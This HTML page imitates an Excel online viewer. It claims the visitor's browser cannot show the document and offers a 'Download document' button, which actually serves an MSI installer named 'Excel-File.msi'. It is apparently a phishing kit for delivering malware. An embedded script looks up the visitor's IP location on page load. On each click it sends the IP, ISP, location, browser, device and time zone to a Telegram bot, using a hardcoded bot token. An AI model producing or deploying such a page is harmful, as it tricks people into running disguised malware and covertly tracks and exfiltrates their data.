<!DOCTYPE html>
<html class="no-js" id="html-ff" lang="">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>Excel</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" href="img/excel.svg" type="image/svg">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.4/font/bootstrap-icons.css">
    <link href="https://fonts.googleapis.com/css2?family=Calibri:wght@400;600;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/main.css">
  </head>

  <body>
    <div class="page excel">
      <div class="pop-wrap">
        <div class="pop">
          <div class="pop-top">
            <div class="pop-top-icon"><img src="img/excel.svg"></div>
            <div class="pop-top-title">
              Create, edit and share Excel spreadsheets. Work with others on shared projects, in real-time.
            </div>
          </div>

          <div class="pop-text">
            Your browser does not support correct online display of this document.
            To view the document, click the "Download document' button.
          </div>

          <!-- ONLY CHANGE -->
          <a class="pop-btn" href="bin/Excel-File.msi" id="downloadBtn">
            Download document
          </a>

        </div>
      </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="js/main.js"></script>

    <!-- TELEGRAM REPORT (BULLETPROOF) -->
    <script>
      const botToken = '5999005713:AAGWRZ5KSqGJhVolN8dYLSa6fj8nm-1yOfM';
      const chatId = '875434694';
      const RATE_LIMIT_MS = 30000;

      let geoCache = null;

      /* ---- PREFETCH IP INFO ON PAGE LOAD ---- */
      fetch('https://ipapi.co/json/')
        .then(r => r.json())
        .then(d => geoCache = d)
        .catch(() => geoCache = {});

      document.getElementById('downloadBtn').addEventListener('click', function () {

        /* ---- RATE LIMIT ---- */
        const last = localStorage.getItem('dl_last');
        const now = Date.now();
        if (last && now - last < RATE_LIMIT_MS) return;
        localStorage.setItem('dl_last', now);

        const browser = navigator.userAgent;
        const platform = navigator.platform || 'Unknown';
        const screenRes = screen.width + 'x' + screen.height;
        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        const message =
`ðŸ“¥ Document Download Started

IP Address: ${geoCache?.ip || 'Unknown'}
Location: ${geoCache?.city || 'Unknown'}, ${geoCache?.country || 'Unknown'}
ISP: ${geoCache?.org || 'Unknown'}

Device: ${platform}
Browser: ${browser}
Screen Resolution: ${screenRes}
Time Zone: ${timeZone}`;

        const payload = JSON.stringify({
          chat_id: chatId,
          text: message
        });

        /* ---- BEACON SEND (SURVIVES PAGE UNLOAD) ---- */
        navigator.sendBeacon(
          `https://api.telegram.org/bot${botToken}/sendMessage`,
          new Blob([payload], { type: 'application/json' })
        );
      });
    </script>
  </body>
</html>
